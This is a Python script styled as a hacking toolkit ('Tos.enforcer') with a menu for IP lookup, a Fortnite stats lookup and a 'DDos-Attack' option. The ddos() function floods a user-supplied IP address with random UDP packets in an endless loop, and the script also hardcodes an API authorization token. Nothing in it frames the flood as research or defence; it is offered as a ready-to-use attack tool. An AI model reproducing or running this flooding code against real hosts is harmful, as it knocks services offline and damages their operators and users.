import colorama, requests, os, time, random, json
from colorama import Fore,init
banner_id = f"""

▄▄▄▄▄      .▄▄ ·     ▄▄▄ . ▐ ▄ ·▄▄▄      ▄▄▄   ▄▄· ▄▄▄ .▄▄▄  
•██  ▪     ▐█ ▀.     ▀▄.▀·•█▌▐█▐▄▄·▪     ▀▄ █·▐█ ▌▪▀▄.▀·▀▄ █·
 ▐█.▪ ▄█▀▄ ▄▀▀▀█▄    ▐▀▀▪▄▐█▐▐▌██▪  ▄█▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄▐▀▀▄ 
 ▐█▌·▐█▌.▐▌▐█▄▪▐█    ▐█▄▄▌██▐█▌██▌.▐█▌.▐▌▐█•█▌▐███▌▐█▄▄▌▐█•█▌
 ▀▀▀  ▀█▄▀▪ ▀▀▀▀      ▀▀▀ ▀▀ █▪▀▀▀  ▀█▄▀▪.▀  ▀·▀▀▀  ▀▀▀ .▀  ▀\nAccount Stat Resolver \nDeveloped By @afftrekken 
"""
ddos_banner = f"""
{Fore.LIGHTCYAN_EX}
▄▄▄▄▄      .▄▄ ·     ▄▄▄ . ▐ ▄ ·▄▄▄      ▄▄▄   ▄▄· ▄▄▄ .▄▄▄  
•██  ▪     ▐█ ▀.     ▀▄.▀·•█▌▐█▐▄▄·▪     ▀▄ █·▐█ ▌▪▀▄.▀·▀▄ █·
 ▐█.▪ ▄█▀▄ ▄▀▀▀█▄    ▐▀▀▪▄▐█▐▐▌██▪  ▄█▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄▐▀▀▄ 
 ▐█▌·▐█▌.▐▌▐█▄▪▐█    ▐█▄▄▌██▐█▌██▌.▐█▌.▐▌▐█•█▌▐███▌▐█▄▄▌▐█•█▌
 ▀▀▀  ▀█▄▀▪ ▀▀▀▀      ▀▀▀ ▀▀ █▪▀▀▀  ▀█▄▀▪.▀  ▀·▀▀▀  ▀▀▀ .▀  ▀\nDdos Attack \nDeveloped By @afftrekken
"""

def id():

     headers={
    "authorization": "e9f65bce-0bda-485f-8126-cc7c54a97e6e"
  }
     username = input()
     r=requests.get(f'https://fortnite-api.com/v2/stats/br/v2?name={username}',headers=headers)
     os.system('clear')
     print(f'\n{banner_id}\n═════════════════════════════════════\n {r.text}\n═════════════════════════════════════')
os.system('title Tos.enforcer Net')
def ddos():
    os.system('clear')
    import socket, random
    s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print(f'═════════════════════════════════════\n Please enter the ip & port below\n═════════════════════════════════════')
   # ip = input(f'{Fore.LIGHTBLUE_EX}╚════════> ')
   
    
    port = 80
    inp = input(f'{Fore.LIGHTBLUE_EX}╚════════>')

    while True:

        s.connect((f"{inp}", port))
 
        for i in range(1, 100**1000):
         s.send(random._urandom(10)*1000)
         os.system(f'title Tos.enforcer Net Requests Sended: {i} Developed By @afftrekken')
         os.system('cls')
         print(f"\n{ddos_banner}\n{Fore.LIGHTBLACK_EX}═════════════════════════════════════\n{Fore.LIGHTMAGENTA_EX}Requests sended: \n{i} times\n{Fore.LIGHTBLACK_EX}═════════════════════════════════════", end='\r')

ip_banner = """
  _____ _____      _____ _   _ ______ ____  
 |_   _|  __ \    |_   _| \ | |  ____/ __ \ 
   | | | |__) |_____| | |  \| | |__ | |  | |
   | | |  ___/______| | | . ` |  __|| |  | |
  _| |_| |         _| |_| |\  | |   | |__| |
 |_____|_|        |_____|_| \_|_|    \____/ \n═════════════════════════════════════\nSuccessfull Looked-up\n═════════════════════════════════════
                                            
                                            

"""
print(f'{Fore.LIGHTBLACK_EX} DDD')
os.system('clear')
def ip_lookup():
    os.system('clear')
    print('\n═════════════════════════════════════\nPlease-Enter-An-valid-ip\n═════════════════════════════════════')
    ip = input(f'{Fore.BLUE} ╚════════>')
    r=requests.get(f'https://ipinfo.io/{ip}')
    os.system('cls')
    print(f'\n{Fore.LIGHTGREEN_EX}{ip_banner}\n {Fore.LIGHTBLACK_EX}╔══════════════════════════════════ \n   {Fore.GREEN}{r.text} \n Made By TikTok afftrekken \n{Fore.LIGHTBLACK_EX}╚══════════════════════════════════ ')
    time.sleep(10)
    os.system('clear')
    main()
banner = f"""
{Fore.LIGHTRED_EX}
▄▄▄█████▓ ▒█████    ██████    ▓█████  ███▄    █   █████▒▒█████   ██▀███   ▄████▄  ▓█████  ██▀███  
▓  ██▒ ▓▒▒██▒  ██▒▒██    ▒    ▓█   ▀  ██ ▀█   █ ▓██   ▒▒██▒  ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ ▓██ ▒ ██▒
▒ ▓██░ ▒░▒██░  ██▒░ ▓██▄      ▒███   ▓██  ▀█ ██▒▒████ ░▒██░  ██▒▓██ ░▄█ ▒▒▓█    ▄ ▒███   ▓██ ░▄█ ▒
░ ▓██▓ ░ ▒██   ██░  ▒   ██▒   ▒▓█  ▄ ▓██▒  ▐▌██▒░▓█▒  ░▒██   ██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ ▒██▀▀█▄  
  ▒██▒ ░ ░ ████▓▒░▒██████▒▒   ░▒████▒▒██░   ▓██░░▒█░   ░ ████▓▒░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒░██▓ ▒██▒
  ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░   ░░ ▒░ ░░ ▒░   ▒ ▒  ▒ ░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░░ ▒▓ ░▒▓░
    ░      ░ ▒ ▒░ ░ ░▒  ░ ░    ░ ░  ░░ ░░   ░ ▒░ ░       ░ ▒ ▒░   ░▒ ░ ▒░  ░  ▒    ░ ░  ░  ░▒ ░ ▒░
  ░      ░ ░ ░ ▒  ░  ░  ░        ░      ░   ░ ░  ░ ░   ░ ░ ░ ▒    ░░   ░ ░           ░     ░░   ░ 
             ░ ░        ░        ░  ░         ░            ░ ░     ░     ░ ░         ░  ░   ░     
═════════════════════════════════════
                                                                      ░                        
[1] Ip-lookup
[2] DDos-Attack
[3] ID-Resolver \n═════════════════════════════════════
"""
def main():
    print(banner)
    choice = input(f'{Fore.RED} ╚════════> ')
    if choice == "1":
        ip_lookup()
    if choice == "2":
        ddos()

main()
